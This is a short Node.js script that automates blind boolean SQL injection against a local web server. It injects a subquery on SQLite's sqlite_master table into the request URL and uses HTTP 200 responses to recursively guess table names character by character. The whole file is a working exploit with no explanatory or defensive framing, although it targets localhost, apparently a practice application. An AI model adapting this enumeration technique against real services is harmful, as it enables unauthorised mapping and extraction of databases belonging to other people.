const request = require('sync-request');

function get(url) {
  return request('GET', url);
}

function getTableName(name) {
  const url = `http://localhost:3000/1%20and%20(select%20count(*)%20from%20sqlite_master%20where%20substr(tbl_name,%201,%20${name.length})%20=%20'${name}')%20%3E%200`;
  return get(url);
}

const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'.split('');

function search(optBase) {
  const base = optBase || '';

  chars
    .map(c => base + c)
    .forEach(name => {
      const response = getTableName(name);
      if (response.statusCode === 200) {
        console.log(name + '*');
        search(name);
      }
    });
}

search();
